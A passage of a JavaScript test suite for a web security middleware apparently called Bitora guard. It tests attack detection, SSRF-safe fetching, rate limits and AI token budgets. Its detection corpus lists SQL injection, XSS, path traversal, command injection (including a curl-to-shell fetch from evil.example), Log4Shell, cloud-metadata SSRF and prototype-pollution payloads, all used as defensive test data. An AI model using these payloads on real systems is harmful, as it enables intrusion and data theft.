  for (let i = 0; i < 5; i++) assert.equal((await g.check(web('/'))).action, 'allow')
  assert.equal((await g.check(web('/.env'))).action, 'block', 'the trap still answers, but it blames nobody')
  assert.equal((await g.check(web('/'))).action, 'allow')
})

test('the Express adapter reads the answer of the app and counts failed logins by account', async () => {
  const { guard, sent } = watched()
  const mw = bitoraExpress(guard)
  for (let i = 0; i < 12; i++) {
    const handlers = {}
    const req = { method: 'POST', originalUrl: '/api/login', url: '/api/login', headers: { 'x-forwarded-for': '6.6.6.6, 5.5.5.' + i }, socket: { remoteAddress: '10.0.0.2' }, body: { email: 'victim@x.com', password: 'p' } }
    const res = { statusCode: 401, on: (e, f) => (handlers[e] = f), setHeader() {}, end() {} }
    await new Promise((resolve) => mw(req, res, resolve))
    handlers.finish()
  }
  await guard.flush()
  assert.ok(sent.some((e) => e.kind === 'brute_force'), JSON.stringify(sent))
})

test('the Hono adapter reads c.res after the handler and the Next route wrapper sees the status and the id', async () => {
  const { guard, sent } = watched()
  const mw = bitoraHono(guard)
  for (let i = 0; i < 12; i++) {
    const raw = web('/api/login', { ip: '7.7.7.' + i, method: 'POST', headers: { 'content-type': 'application/json' } })
    const c = { req: { raw, url: raw.url, method: 'POST', header: () => '' }, res: { status: 401 }, json: () => null }
    await mw(c, async () => {})
  }
  const wrapped = guard.route(async () => new Response('{}', { status: 404 }), { idParam: 'id' })
  for (let i = 0; i < 40; i++) await wrapped(web('/api/doc/' + i, { ip: '8.8.4.4' }), { params: Promise.resolve({ id: String(i) }) })
  await guard.flush()
  assert.ok(sent.some((e) => e.kind === 'scan_probe'), JSON.stringify(sent.map((e) => e.kind)))
  assert.ok(sent.some((e) => e.kind === 'id_sweep' || e.kind === 'scan_probe'))
})

test('auth.failed and event never throw, and an event sends only a name', async () => {
  const { guard, sent } = watched()
  assert.doesNotThrow(() => guard.auth.failed())
  assert.doesNotThrow(() => guard.event(null))
  guard.event('Price Tampered!!', { ip: '8.8.4.4', note: 'secret-value-9' })
  await guard.flush()
  const e = sent.find((x) => x.kind === 'app_event')
  assert.equal(e.param, 'pricetampered')
  assert.ok(!JSON.stringify(sent).includes('secret-value-9'))
})

// ---- the Shield (guard 2.0, F2) ----
import { createShield, RULES } from './pkg/shield.js'

const scoreOf = (shield, { query = '', body, path = '/api/x', agent = 'Mozilla/5.0' } = {}) => shield.scan({ path, search: query, body, agent })

// Payloads taken from the usual sqlmap / XSS / traversal / NoSQL lists. Each must reach the threshold at level 1.
const ATTACKS = {
  sqli: [
    "?id=1' OR '1'='1", "?id=1 OR 1=1", "?q=1 UNION SELECT username,password FROM users", "?q=1/**/UNION/**/SELECT/**/1,2,3",
    "?q=1;DROP TABLE users", "?q=1' AND SLEEP(5)", "?q=1; WAITFOR DELAY '0:0:5'", "?q=' UNION ALL SELECT table_name FROM information_schema.tables--",
    '?q=%27%20OR%20%271%27%3D%271', '?q=1%27%20union%20select%201%2C2--', "?q=1) OR (1=1", "?q=x' or 'a'='a",
    // the shapes of sqlmap with a browser User-Agent that the first rules let through (deploy/lab-attack)
    '?id=(CASE WHEN 5413=5413 THEN 5413 ELSE NULL END)', '?id=1) AND (SELECT (CASE WHEN (5413=5413) THEN NULL ELSE CTXSYS.DRITHSX.SN(5413,5413) END) FROM DUAL) IS NULL',
    '?id=1 RLIKE (SELECT (CASE WHEN (5413=5413) THEN 1 ELSE 0x28 END))', '?id=1)) AND 5413=4961 AND ((6735=6735', '?id=1)) ORDER BY 7-- okuB',
    "?id=1;DECLARE @cbNn NVARCHAR(4000);SET @cbNn=(SELECT 'q');RAISERROR(@cbNn,16,1)--", '?id=1 AND 2174=(SELECT 2174 FROM (SELECT(SLEEP(5)))x)',
    '?id=1%29%29%20AND%205413%3D4961%20AND%20%28%286735%3D6735',
  ],
  xss: [
    '?q=<script>alert(1)</script>', '?q=%3Cscript%3Ealert(1)%3C/script%3E', '?q=<img src=x onerror=alert(1)>', '?q=<svg/onload=alert(1)>',
    '?q=<a href="javascript:alert(1)">x</a>', '?u=javascript:alert(document.cookie)', '?q="><script src=//evil.example/x.js></script>', '?q=<body onload=alert(1)>',
  ],
  lfi: ['?f=../../../../etc/passwd', '?f=..%2f..%2f..%2fetc%2fpasswd', '?f=....//....//etc/passwd', '?f=/etc/passwd', '?f=php://filter/convert.base64-encode/resource=index.php', '?f=%2e%2e%2f%2e%2e%2fwindows/win.ini', '?f=file:///etc/hosts'],
  rce: ['?c=;cat /etc/passwd', '?c=|whoami', '?c=$(id)', '?c=`uname -a`', '?c=x %26%26 curl http://evil.example/s.sh | sh', '?h=${jndi:ldap://evil.example/a}'],
  ssrf: ['?url=http://169.254.169.254/latest/meta-data/', '?url=http://metadata.google.internal/computeMetadata/v1/'],
}

test('the Shield reaches the threshold on every attack of the corpus', () => {
  const shield = createShield()
  const missed = []
  for (const [family, list] of Object.entries(ATTACKS)) for (const q of list) if (scoreOf(shield, { query: q }).score < 5) missed.push(family + ' ' + q)
  assert.deepEqual(missed, [])
})

test('NoSQL operators, prototype pollution and SSRF in a JSON body or form field', () => {
  const shield = createShield()
  assert.ok(scoreOf(shield, { body: { user: 'a', password: { $ne: null } } }).score >= 5)
  assert.ok(scoreOf(shield, { body: { filter: { $where: 'sleep(100)' } } }).score >= 5)
  assert.ok(scoreOf(shield, { body: JSON.parse('{"a":{"__proto__":{"admin":true}}}') }).score >= 5)
  assert.ok(scoreOf(shield, { body: { constructor: { prototype: { x: 1 } } } }).score >= 5)
  assert.ok(scoreOf(shield, { query: '?user[$ne]=x' }).score >= 5)
  assert.ok(scoreOf(shield, { query: '?__proto__[admin]=1' }).score >= 5)
  assert.ok(scoreOf(shield, { body: { webhook: 'http://169.254.169.254/latest' } }).score >= 5)
  assert.ok(scoreOf(shield, { body: { items: [{ q: "1' union select 1,2--" }] } }).score >= 5, 'nested values are read')
  assert.ok(scoreOf(shield, { agent: 'sqlmap/1.7' }).score >= 5, 'a scanner that names itself')
  assert.ok(scoreOf(shield, { agent: '${jndi:ldap://x/a}' }).score >= 0)
})

// Ordinary traffic that carries the same characters. At level 1 nothing may reach the threshold.
const LEGIT = [
  "?name=O'Brien", "?name=D'Angelo&city=L'Hospitalet", '?q=rock \'n\' roll', "?q=it's 5 o'clock", '?q="quoted phrase" other', '?comment=great -- thanks',
  '?pw=p%40ss\'word--#1', '?pw=\'--', '?pw=a" or b', '?email=ana+test@example.com', '?redirect=https://example.com/a?b=c&d=e', '?next=/dashboard',
  '?q=select the best one from the list', '?q=union of two sets', '?q=drop the beat', '?q=I want to delete my account', '?q=update my address', '?q=insert coin',
  '?q=1 or 2 people', '?q=this and that', '?q=and=or', '?sort=name&order=desc&page=2', '?q=C%2B%2B+tutorial', '?q=a%26b', '?path=/docs/guide/intro',
  '?q=<3 you', '?q=5 < 6 and 7 > 3', '?msg=use <b>bold</b> for emphasis', '?q=email@example.com;other@example.com', '?q=cat food', '?q=id card', '?q=ls',
  '?q=sleep better', '?q=1;2;3', '?q=case when it rains then stay home', '?q=order by 2 days', '?q=pick (select one) of three', '?q=sizes 40 and 42 are medium', '?q=take 2 and 3 = 5', '?q=declare your income', '?q=a and (b or c)', '?q=shutdown schedule 10-12', '?price=10%7C20', '?url=https://example.com', '?img=https://cdn.example.com/a.png', '?lang=es-ES', '?t=2026-10-29T10:00:00Z',
  '?q=http://localhost-news.example.com', '?q=../docs', '?file=report..final.pdf', '?q=etc passwd policy', '?q=$100 off', '?q=${name} is a placeholder in my template',
]

test('ordinary traffic with quotes, dashes, SQL words and angle brackets is not flagged at level 1', () => {
  const shield = createShield()
  const flagged = LEGIT.map((q) => [q, scoreOf(shield, { query: q })]).filter(([, r]) => r.score >= 5)
  assert.deepEqual(flagged.map(([q, r]) => q + ' ' + JSON.stringify(r.matched)), [])
  const body = {
    name: "Sinéad O'Connor", bio: 'I like SQL: SELECT is fun, and so is DROP-in replacement. Use -- for comments.', markdown: '# Title\n\n```js\nconst a = 1 || 2; if (a && b) {}\n```\n- item\n- **bold** <br>',
    price: { amount: 10, currency: 'EUR' }, tags: ['a', 'b'], search: '"exact" OR "other"', link: 'https://example.com/path?x=1&y=2', password: "Tr0ub4dor&3'--;",
  }
  assert.ok(scoreOf(createShield(), { body }).score < 5, JSON.stringify(scoreOf(createShield(), { body }).matched))
})

test('level 2 catches more and is allowed to be wrong more often; level 1 stays quiet on the same text', () => {
  const l1 = createShield({ paranoia: 1 })
  const l2 = createShield({ paranoia: 2 })
  const q = '?q=select name, email from users where id = 4'
  assert.equal(scoreOf(l1, { query: q }).score, 0)
  assert.ok(scoreOf(l2, { query: q }).score >= 3)
  assert.ok(l2.level === 2 && RULES.some((r) => r.pl === 2))
})

test('exclusions silence a rule on one parameter or route and nothing else', () => {
  const shield = createShield({ exclusions: [{ match: '/api/posts', params: ['body.markdown'], rules: ['xss'] }] })
  const html = '<script>alert(1)</script>'
  assert.equal(scoreOf(shield, { path: '/api/posts', body: { markdown: html } }).score, 0, 'excluded parameter')
  assert.ok(scoreOf(shield, { path: '/api/posts', body: { title: html } }).score >= 5, 'another parameter of the same route')
  assert.ok(scoreOf(shield, { path: '/api/comments', body: { markdown: html } }).score >= 5, 'another route')
  assert.ok(scoreOf(shield, { path: '/api/posts', body: { markdown: "1' union select 1,2--" } }).score >= 5, 'another rule on the same parameter')
})

test('what is reported names the rule and the parameter, never the value', async () => {
  const { guard, sent } = watched({ mode: 'enforce' })
  const secret = 'S3CR3T-payload-77'
  const d = await guard.check(web('/api/search?q=' + encodeURIComponent("' union select '" + secret + "',2--"), { ip: '8.8.4.4' }))
  assert.equal(d.status, 403)
  await guard.flush()
  const e = sent.find((x) => x.kind === 'shield')
  assert.ok(e && e.param === 'query.q' && e.rules.includes('sqli.union') && e.action === 'blocked' && e.score === 5, JSON.stringify(sent))
  assert.ok(!JSON.stringify(sent).includes(secret))
})

test('observe mode only says what the Shield would have done', async () => {
  const { guard, sent } = watched()
  assert.equal((await guard.check(web('/s?q=<script>alert(1)</script>', { ip: '8.8.4.4' }))).wouldHave, 'shield')
  await guard.flush()
  assert.ok(sent.some((x) => x.kind === 'shield' && x.would_have === true))
})

test('the Shield reads an Express body already parsed and a Hono JSON body, and a clean body passes', async () => {
  const { guard } = watched({ mode: 'enforce' })
  const mw = bitoraExpress(guard)
  const run = (body, ip) =>
    new Promise((resolve) => {
      const req = { method: 'POST', originalUrl: '/api/login', url: '/api/login', headers: {}, socket: { remoteAddress: ip }, body }
      const res = { statusCode: 200, on() {}, setHeader() {}, end() { resolve(res.statusCode) } }
      mw(req, res, () => resolve(200))
    })
  assert.equal(await run({ email: { $ne: '' }, password: { $ne: '' } }, '8.8.4.4'), 403)
  assert.equal(await run({ email: 'a@b.es', password: "it's-fine--" }, '8.8.8.8'), 200)
  const hono = bitoraHono(guard)
  const raw = (b) => web('/api/x', { ip: '8.8.1.9', method: 'POST', headers: { 'content-type': 'application/json' } })
  const mk = (b, ip) => new Request('https://shop.example.com/api/x', { method: 'POST', headers: { 'x-forwarded-for': ip, 'content-type': 'application/json', 'content-length': String(JSON.stringify(b).length) }, body: JSON.stringify(b) })
  const out = []
  for (const [b, ip] of [[{ a: JSON.parse('{"__proto__":{"x":1}}') }, '8.8.1.9'], [{ a: 'fine' }, '8.8.1.10']]) {
    const r = mk(b, ip)
    const c = { req: { raw: r, url: r.url, method: 'POST', header: () => '' }, res: { status: 200 }, json: (x, s) => ((out.push(s)), null) }
    await hono(c, async () => out.push(200))
  }
  assert.deepEqual(out, [403, 200])
})

test('guard.route checks the body before the handler of a Next route runs, and fails open on a broken body', async () => {
  const { guard } = watched({ mode: 'enforce' })
  let ran = 0
  const wrapped = guard.route(async () => (ran++, new Response('ok')))
  const post = (body, ct = 'application/json') => new Request('https://shop.example.com/api/x', { method: 'POST', headers: { 'x-forwarded-for': '8.8.4.4', 'content-type': ct }, body })
  assert.equal((await wrapped(post('{"q":{"$where":"1"}}'))).status, 403)
  assert.equal(ran, 0, 'the handler never saw it')
  assert.equal((await wrapped(post('{"q":"hola"}'))).status, 200)
  assert.equal((await wrapped(post('{not json'))).status, 200, 'a body that cannot be read is let through')
  assert.equal(ran, 2)
})

test('the Shield can be switched off, and an address nobody vouches for earns no score', async () => {
  const off = g2({ mode: 'enforce', shield: { enabled: false } })
  assert.equal((await off.check(web('/s?q=<script>x</script>', { ip: '8.8.4.4' }))).action, 'allow')
  const g = createGuard({ mode: 'enforce', remote: { enabled: false }, report: { enabled: false } })
  const a = await g.check(web('/s?q=<script>x</script>'))
  assert.equal(a.status, 403, 'the request itself is still refused')
  assert.equal((await g.check(web('/ok'))).action, 'allow', 'but nobody is blamed for it')
})

// ---- sinks and flows (guard 2.0, F4) ----
import { guardFetch, isPublicIp, BlockedUrlError } from './pkg/node.js'
import http from 'node:http'

test('isPublicIp: private, loopback, link-local, mapped and embedded addresses are not public; ordinary ones are', () => {
  const no = [
    '127.0.0.1', '10.1.2.3', '172.16.0.1', '172.31.255.255', '192.168.1.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '224.0.0.1', '255.255.255.255', '192.0.2.5', '198.18.0.1',
    '::1', '::', 'fc00::1', 'fd12:3456::1', 'fe80::1', 'ff02::1', '::ffff:127.0.0.1', '::ffff:7f00:1', '::ffff:169.254.169.254', '64:ff9b::a9fe:a9fe', '2002:a9fe:a9fe::1', '2001:db8::1', 'not-an-ip',
  ]
  const yes = ['8.8.8.8', '1.1.1.1', '172.15.0.1', '172.32.0.1', '100.63.255.255', '2606:4700:4700::1111', '2001:4860:4860::8888', '::ffff:8.8.8.8']
  assert.deepEqual(no.filter(isPublicIp), [])
  assert.deepEqual(yes.filter((x) => !isPublicIp(x)), [])
})

// A fetch whose DNS and sockets are pretend: it records which address it was told to connect to.
const sink = ({ dns = { 'ok.example.com': ['93.184.216.34'] }, responses = {} } = {}) => {
  const calls = []
  const notes = []
  const guard = { note: (k, a) => notes.push([k, a.param]) }
  const f = guardFetch(guard, {
    resolve: async (h) => (dns[h] || []).map((address) => ({ address, family: address.includes(':') ? 6 : 4 })),
    dispatch: async (u, target, init) => {
      calls.push({ url: u.href, ip: target.address, init })
      return responses[u.href] || { status: 200, headers: { 'content-type': 'text/plain' }, body: Buffer.from('hola') }
    },
  })
  return { f, calls, notes }
}
const blockedWith = async (p) => {
  try {
    await p
  } catch (e) {
    return e instanceof BlockedUrlError ? e.reason : 'other:' + e.message
  }
  return 'allowed'
}

test('guardFetch: scheme, port, credentials, literal addresses and names that resolve inside are refused', async () => {
  const { f, calls, notes } = sink({ dns: { 'ok.example.com': ['93.184.216.34'], 'evil.example.com': ['10.0.0.5'], 'mixed.example.com': ['93.184.216.34', '169.254.169.254'] } })
  assert.equal(await blockedWith(f('file:///etc/passwd')), 'scheme')
  assert.equal(await blockedWith(f('ftp://ok.example.com/x')), 'scheme')
  assert.equal(await blockedWith(f('https://ok.example.com:8443/x')), 'port')
  assert.equal(await blockedWith(f('https://user:pw@ok.example.com/')), 'credentials')
  assert.equal(await blockedWith(f('http://169.254.169.254/latest/meta-data/')), 'private_address')
  assert.equal(await blockedWith(f('http://2130706433/')), 'private_address', 'the decimal form of 127.0.0.1')
  assert.equal(await blockedWith(f('http://0x7f.1/')), 'private_address')
  assert.equal(await blockedWith(f('http://[::1]/')), 'private_address')
  assert.equal(await blockedWith(f('http://[::ffff:7f00:1]/')), 'private_address')
  assert.equal(await blockedWith(f('https://evil.example.com/')), 'private_address')
  assert.equal(await blockedWith(f('https://mixed.example.com/')), 'private_address', 'one bad answer spoils the name')
  assert.equal(await blockedWith(f('https://nowhere.example.com/')), 'dns_failed')
  assert.equal(await blockedWith(f('not a url')), 'invalid_url')
  assert.equal(calls.length, 0, 'nothing was ever sent to any of them')
  assert.ok(notes.some(([k, p]) => k === 'ssrf_blocked' && p === 'private_address'), 'the owner is told, with the reason and no address')
})

test('guardFetch connects to the address it checked, and a normal address works', async () => {
  const { f, calls } = sink()
  const res = await f('https://ok.example.com/path?q=1', { method: 'POST', body: 'x', headers: { Authorization: 'Bearer t' } })
  assert.equal(res.status, 200)
  assert.equal(await res.text(), 'hola')
  assert.equal(calls[0].ip, '93.184.216.34', 'the connection goes to the address that passed the check, not to the name again')
  assert.equal(calls[0].init.method, 'POST')
})

test('guardFetch checks every redirect, drops credentials on the way and stops redirect loops', async () => {
  const dns = { 'ok.example.com': ['93.184.216.34'], 'other.example.com': ['93.184.216.35'] }
  const responses = {
    'https://ok.example.com/a': { status: 302, headers: { location: 'http://169.254.169.254/' }, body: Buffer.alloc(0) },
    'https://ok.example.com/b': { status: 302, headers: { location: 'https://other.example.com/c' }, body: Buffer.alloc(0) },
    'https://other.example.com/c': { status: 200, headers: {}, body: Buffer.from('fin') },
    'https://ok.example.com/loop': { status: 302, headers: { location: '/loop' }, body: Buffer.alloc(0) },
  }
  const t = sink({ dns, responses })
  assert.equal(await blockedWith(t.f('https://ok.example.com/a')), 'private_address', 'a redirect to the inside is refused like the first address')
  const ok = await t.f('https://ok.example.com/b', { headers: { authorization: 'Bearer secret', 'x-ok': '1' } })
  assert.equal(await ok.text(), 'fin')
  const last = t.calls.at(-1)
  assert.equal(last.ip, '93.184.216.35')
  assert.equal(last.init.headers.authorization, undefined, 'a credential for one host is not sent to the next')
  assert.equal(last.init.headers['x-ok'], '1')
  assert.equal(await blockedWith(t.f('https://ok.example.com/loop')), 'too_many_redirects')
})

test('guardFetch: allow-list of hosts', async () => {
  const { f } = sink({ dns: { 'api.stripe.com': ['93.184.216.34'], 'x.partner.com': ['93.184.216.34'], 'evil.com': ['93.184.216.34'] } })
  const g = guardFetch({ note() {} }, { allow: ['api.stripe.com', '.partner.com'], resolve: async () => [{ address: '93.184.216.34', family: 4 }], dispatch: async () => ({ status: 200, headers: {}, body: Buffer.from('') }) })
  assert.equal((await g('https://api.stripe.com/v1')).status, 200)
  assert.equal((await g('https://x.partner.com/')).status, 200)
  assert.equal(await blockedWith(g('https://evil.com/')), 'not_allowed')
  assert.ok(f)
})

test('guardFetch against a real server: refuses it by default, and with allowPrivate it limits the size of the answer', async () => {
  const server = http.createServer((req, res) => {
    if (req.url === '/big') return res.end('x'.repeat(5000))
    res.end('hello')
  })
  await new Promise((r) => server.listen(0, '127.0.0.1', r))
  const port = server.address().port
  try {
    const refuse = guardFetch(null, { ports: [port] })
    assert.equal(await blockedWith(refuse('http://127.0.0.1:' + port + '/')), 'private_address')
    const dev = guardFetch(null, { ports: [port], allowPrivate: true, maxBytes: 1000 })
    assert.equal(await (await dev('http://127.0.0.1:' + port + '/')).text(), 'hello')
    assert.equal(await blockedWith(dev('http://127.0.0.1:' + port + '/big')), 'too_large')
  } finally {
    server.close()
  }
})

test('flows: a named budget per user, per address and for the whole site; observe mode only says what it would do', () => {
  const flows = { sms_send: { perUser: { max: 2, windowSec: 3600 }, perIp: { max: 4, windowSec: 3600 }, global: { max: 6, windowSec: 3600 } } }
  const g = g2({ mode: 'enforce', flows })
  assert.equal(g.flow('sms_send', { user: 'u1', ip: '8.8.8.1' }).action, 'allow')
  assert.equal(g.flow('sms_send', { user: 'u1', ip: '8.8.8.1' }).action, 'allow')
  const third = g.flow('sms_send', { user: 'u1', ip: '8.8.8.1' })
  assert.deepEqual([third.action, third.reasons, third.status], ['block', ['user_limit'], 429])
  assert.ok(third.retryAfter > 0)
  assert.equal(g.flow('sms_send', { user: 'u2', ip: '8.8.8.1' }).action, 'allow', 'another user')
  assert.equal(g.flow('unknown_flow', { user: 'u1' }).action, 'allow', 'a flow nobody configured is not limited')
  const watching = g2({ flows })
  for (let i = 0; i < 2; i++) watching.flow('sms_send', { user: 'u1' })
  const w = watching.flow('sms_send', { user: 'u1' })
  assert.equal(w.action, 'allow')
  assert.equal(w.wouldHave, 'flow_limited')
})

test('flows and sign-ups are reported to Bitora, by name and reason only', async () => {
  const { guard, sent } = watched({ mode: 'enforce', flows: { coupon: { perIp: { max: 1, windowSec: 60 } } } })
  guard.flow('coupon', { ip: '8.8.4.4', ipSource: 'socket' })
  guard.flow('coupon', { ip: '8.8.4.4', ipSource: 'socket' })
  guard.signup({ email: 'a@mailinator.com', ip: '8.8.8.9' })
  await guard.flush()
  assert.ok(sent.some((e) => e.kind === 'flow_limited' && e.param === 'coupon' && e.ip === '8.8.4.4'))
  const s = sent.find((e) => e.kind === 'signup_blocked')
  assert.ok(s && s.param === 'disposable_email')
  assert.ok(!JSON.stringify(sent).includes('mailinator'), 'the address typed never leaves')
})

test('isBreached: only five characters of the hash go out, the comparison is local, and a failure is not a verdict', async () => {
  const asked = []
  const fetch = async (url) => {
    asked.push(url)
    return { ok: true, text: async () => '0018A45C4D1DEF81644B54AB7F969B88D65:3\r\n1E4C9B93F3F0682250B6CF8331B7EE68FD8:9545824\r\n00D4F6E8FA6EECAD2A3AA415EEC418D38EC:0' }
  }
  const g = g2({ fetch })
  assert.deepEqual(await g.isBreached('password'), { breached: true, count: 9545824, checked: true })
  assert.equal(asked[0], 'https://api.pwnedpasswords.com/range/5BAA6', 'only the prefix of the hash')
  assert.equal(asked[0].split('/range/')[1].length, 5)
  assert.equal((await g2({ fetch: async () => ({ ok: true, text: async () => '0018A45C4D1DEF81644B54AB7F969B88D65:3' }) }).isBreached('a-long-unique-passphrase-9')).breached, false)
  assert.deepEqual(await g2({ fetch: async () => { throw new Error('down') } }).isBreached('x'), { breached: false, count: 0, checked: false })
  assert.equal((await g2({ fetch: async () => ({ ok: true, text: async () => '1E4C9B93F3F0682250B6CF8331B7EE68FD8:0' }) }).isBreached('password')).breached, false, 'a padded decoy has a count of 0')
})

test('AI spend in a stream: the charge is corrected with the usage the stream reports', async () => {
  const chunks = (list) => ({
    async *[Symbol.asyncIterator]() {
      for (const c of list) yield c
    },
    controller: 'kept',
  })
  const openai = (list) => ({ chat: { completions: { create: async () => chunks(list) } } })
  const guard = g2({ mode: 'enforce', ai: { maxOutputTokens: 1000, perUser: { tokens: 100000, windowSec: 3600 }, global: { tokens: 1000000, windowSec: 3600 } } })
  const run = async (client) => {
    const c = guard.ai.wrap(client, { user: 'u1' })
    const stream = await c.chat.completions.create({ model: 'm', stream: true, messages: [{ role: 'user', content: 'hi' }] })
    assert.equal(stream.controller, 'kept', 'the rest of the stream object is untouched')
    const seen = []
    for await (const ch of stream) seen.push(ch)
    return seen
  }
  // OpenAI: usage in the last chunk
  const seen = await run(openai([{ choices: [{}] }, { choices: [], usage: { prompt_tokens: 10, completion_tokens: 20, total_tokens: 30 } }]))
  assert.equal(seen.length, 2, 'every chunk passes through')
  // a second user whose stream reports tiny usage can keep going far beyond the estimate; the first is charged for 30 tokens, not the estimate
  const tight = g2({ mode: 'enforce', ai: { maxOutputTokens: 1000, perUser: { tokens: 1100, windowSec: 3600 }, global: { tokens: 1000000, windowSec: 3600 } } })
  const mk = (list) => tight.ai.wrap(openai(list), { user: 'u9' })
  const call = async (list) => {
    const s = await mk(list).chat.completions.create({ model: 'm', stream: true, messages: 'hi' })
    for await (const ch of s) void ch
  }
  await call([{ usage: { total_tokens: 40 } }]) // reserved ~1000, settled to 40
  await call([{ usage: { total_tokens: 40 } }]) // would be refused if the first still held ~1000
  // Anthropic: input in message_start, output in message_delta
  const anth = { messages: { create: async () => chunks([{ type: 'message_start', message: { usage: { input_tokens: 12, output_tokens: 1 } } }, { type: 'message_delta', usage: { output_tokens: 50 } }]) } }
  const a = tight.ai.wrap(anth, { user: 'u8' })
  for (let i = 0; i < 2; i++) for await (const ch of await a.messages.create({ stream: true, messages: 'hi' })) void ch // refused on the second if the first kept its reservation
  // a reader that leaves early still settles
  const early = tight.ai.wrap(openai([{ usage: { total_tokens: 5 } }, { choices: [] }, { choices: [] }]), { user: 'u7' })
  for (let i = 0; i < 2; i++) {
    for await (const ch of await early.chat.completions.create({ stream: true, messages: 'hi' })) {
      void ch
      break
    }
  }
  // and a stream that reports nothing keeps the estimate, so the second call is refused
  const silent = tight.ai.wrap(openai([{ choices: [] }]), { user: 'u6' })
  await (async () => { for await (const ch of await silent.chat.completions.create({ stream: true, messages: 'hi' })) void ch })()
  await assert.rejects(silent.chat.completions.create({ stream: true, messages: 'hi' }), /AI budget exceeded/)
})

test('the stores: a window that starts with its first hit and resets, and each adapter speaks its own protocol', async () => {
  let t = 0
  const m = memoryStore({ now: () => t })
  assert.equal((await m.hit('x', 'k', { windowSec: 10 })).count, 1)
  assert.equal((await m.hit('x', 'k', { windowSec: 10, amount: 4 })).count, 5)
  assert.equal((await m.hit('y', 'k', { windowSec: 10 })).count, 1, 'another name is another counter')
  t = 10_000
  assert.equal((await m.hit('x', 'k', { windowSec: 10 })).count, 1, 'the window resets')

  // Upstash: one pipeline with INCRBY, EXPIRE NX and TTL
  let sent
  const up = upstashStore({ url: 'https://eu1.upstash.io/', token: 'tok', fetch: async (u, i) => ((sent = { u, i }), { ok: true, json: async () => [{ result: 3 }, { result: 1 }, { result: 42 }] }) })
  assert.deepEqual(await up.hit('sms', 'u1', { windowSec: 60, amount: 2 }), { count: 3, retryAfter: 42 })
  assert.equal(sent.u, 'https://eu1.upstash.io/pipeline')
  assert.equal(sent.i.headers.authorization, 'Bearer tok')
  assert.deepEqual(JSON.parse(sent.i.body), [['INCRBY', 'bsg:sms:u1', 2], ['EXPIRE', 'bsg:sms:u1', 60, 'NX'], ['TTL', 'bsg:sms:u1']])
  await assert.rejects(upstashStore({ fetch: async () => ({ ok: true }) }).hit('a', 'b', { windowSec: 1 }), /no url/)

  // a Redis client (ioredis names): the first hit starts the window and a key that lost its expiry gets one
  const kv = new Map()
  const expired = []
  const client = { incrby: async (k, n) => kv.set(k, (kv.get(k) || 0) + n).get(k), expire: async (k, s) => expired.push([k, s]), ttl: async () => 30 }
  const rs = redisStore(client)
  assert.equal((await rs.hit('a', 'k', { windowSec: 60 })).count, 1)
  assert.deepEqual(expired, [['bsg:a:k', 60]])
  assert.equal((await rs.hit('a', 'k', { windowSec: 60 })).retryAfter, 30)
  const lost = []
  const noExpiry = redisStore({ incrby: async () => 5, expire: async (k, s) => lost.push([k, s]), ttl: async () => -1 })
  assert.equal((await noExpiry.hit('a', 'k', { windowSec: 60 })).retryAfter, 60)
  assert.deepEqual(lost, [['bsg:a:k', 60]], 'a key that lost its expiry would count forever')
  assert.throws(() => redisStore({}), /incrby/)
  // node-redis names (incrBy) work too
  assert.equal((await redisStore({ incrBy: async () => 1, expire: async () => 1, ttl: async () => 5 }).hit('a', 'k', { windowSec: 9 })).count, 1)

  // Bitora keeps the counter: a block makes the count pass the ceiling so the guard agrees
  let body
  const bt = bitoraStore({ apiUrl: 'https://b.test', secret: 'bsec_x', fetch: async (u, i) => ((body = JSON.parse(i.body)), { ok: true, json: async () => ({ action: 'block', count: 7, retry_after: 33 }) }) })
  const r = await bt.hit('ai', 'user:1', { windowSec: 3600, amount: 5, max: 6 })
  assert.deepEqual(body, { kind: 'meter', name: 'ai', key: 'user:1', amount: 5, max: 6, window_s: 3600 })
  assert.deepEqual(r, { count: 7, retryAfter: 33 })
  await assert.rejects(bitoraStore({}).hit('a', 'b', { windowSec: 1, max: 1 }), /no secret/)
})

test('limit: a counter that can live in a shared store; observe says what it would do, a store that fails lets the request through', async () => {
  const shared = new Map()
  const store = { hit: async (name, key, { windowSec, amount }) => ({ count: shared.set(name + key, (shared.get(name + key) || 0) + amount).get(name + key), retryAfter: windowSec }) }
  const enforce = guard({ mode: 'enforce', store })
  for (let i = 0; i < 3; i++) assert.equal((await enforce.limit('coupon', { key: 'u1', max: 3, windowSec: 3600 })).allowed, true)
  const over = await enforce.limit('coupon', { key: 'u1', max: 3, windowSec: 3600 })
  assert.deepEqual([over.action, over.status, over.allowed, over.retryAfter], ['block', 429, false, 3600])
  assert.equal((await enforce.limit('coupon', { key: 'u2', max: 3, windowSec: 3600 })).allowed, true, 'another user')
  // a second instance of the server that shares the store sees the same count
  const other = guard({ mode: 'enforce', store })
  assert.equal((await other.limit('coupon', { key: 'u1', max: 3, windowSec: 3600 })).allowed, false)

  const observe = guard({ store })
  for (let i = 0; i < 3; i++) await observe.limit('sms', { key: 'k', max: 3 })
  const o = await observe.limit('sms', { key: 'k', max: 3 })
  assert.deepEqual([o.action, o.wouldHave], ['allow', 'flow_limited'])

  const broken = guard({ mode: 'enforce', store: { hit: async () => { throw new Error('down') } } })
  assert.deepEqual(await broken.limit('x', { key: 'k', max: 1 }), { action: 'allow', allowed: true, count: 0, checked: false })
  assert.equal((await enforce.limit('Bad Name', { key: 'k', max: 1 })).checked, false, 'a bad name is not counted')
  // the default store is this instance
  const local = guard({ mode: 'enforce' })
  await local.limit('a', { key: 'k', max: 1 })
  assert.equal((await local.limit('a', { key: 'k', max: 1 })).allowed, false)
})

test('decide: asks Bitora for the shared decisions, sends the e-mail only for its domain to be read, and fails open', async () => {
  let body
  let answer = { action: 'block', reasons: ['no_mx'], retry_after: 5 }
  const fetch = async (u, i) => ((body = { u, ...JSON.parse(i.body) }), { ok: true, json: async () => answer })
  const g = createGuard({ secret: 'bsec_x', trustProxy: 1, fetch, remote: { enabled: false }, report: { enabled: false }, mode: 'enforce' })
  const d = await g.decide('signup', { email: 'a@nomail.example', ip: '8.8.8.8', ipSource: 'socket' })
  assert.deepEqual([d.action, d.reasons, d.retryAfter], ['block', ['no_mx'], 5])
  assert.equal(body.u, 'https://security.bitora.es/api/v1/guard/decide')
  assert.deepEqual([body.kind, body.email, body.ip, body.ip_source], ['signup', 'a@nomail.example', '8.8.8.8', 'socket'])
  const observing = createGuard({ secret: 'bsec_x', fetch, remote: { enabled: false }, report: { enabled: false } })
  const w = await observing.decide('signup', { email: 'a@nomail.example' })
  assert.deepEqual([w.action, w.wouldHave], ['allow', 'blocked'])
  answer = { action: 'allow', reasons: [] }
